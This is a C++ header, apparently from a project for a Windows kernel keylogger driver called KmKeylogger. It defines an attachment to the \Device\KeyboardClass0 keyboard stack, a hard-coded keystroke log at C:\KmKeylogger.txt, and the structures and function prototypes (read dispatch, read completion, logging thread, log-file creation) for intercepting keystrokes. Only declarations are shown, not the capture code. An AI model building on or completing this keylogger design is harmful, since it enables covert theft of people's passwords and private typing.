#pragma once
#define TARGET_DEVICE_NAME L"\\Device\\KeyboardClass0"
#define KEYBOARD_DEVICE_NAME L"\\Device\\KmKeylogger"
#define KEYBOARD_LOGFILE	L"\\??\\C:\\KmKeylogger.txt"



namespace KKeylogger {

	namespace ScanCodes {
		typedef struct
		{
			bool kSHIFT;
			bool kCAPSLOCK;
			bool kCTRL;
			bool kALT;
		} KEY_STATE, *PKEY_STATE;


		typedef struct
		{
			char KeyData;
			char KeyFlags;
			ULONG_PTR Dummy;
		} KEY_CODE_DATA, *PKEY_CODE_DATA;

	}

	typedef struct
	{ 
		PDEVICE_OBJECT Self;
		UNICODE_STRING SelfName;
		PDEVICE_OBJECT LowerDevice;
		UNICODE_STRING LowerDeviceName;
		PETHREAD WorkerThread;
		BOOLEAN ThreadTerminate;
		HANDLE LogFile;
		ScanCodes::KEY_STATE KeyState;
		KSEMAPHORE SemaphoreLock;
		PNPAGED_LOOKASIDE_LIST LookasideList;
		ScanCodes::PKEY_CODE_DATA KeyCodeData;
	} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

	extern ULONG_PTR PendingIrps;

	NTSTATUS
	CreateAttachKeylogger(
		PDRIVER_OBJECT DriverObj
	);
	
	NTSTATUS
	ReadDispatch(
		PDEVICE_OBJECT DeviceObj,
		PIRP Irp
	);
	
	NTSTATUS
	DummyDispatch(
		PDEVICE_OBJECT DeviceObj,
		PIRP Irp
	);
	
	NTSTATUS
	OnReadCompletion(
		PDEVICE_OBJECT Keyboard,
		PIRP Irp,
		PVOID Context
	);

	VOID
	Unload(
		PDRIVER_OBJECT DriverObj
	);

	NTSTATUS
	CreateLogFile(
		PDRIVER_OBJECT DriverObj
	);
	
	NTSTATUS
		InitializeThreadLogger(
			PDRIVER_OBJECT DriverObj
		);
}


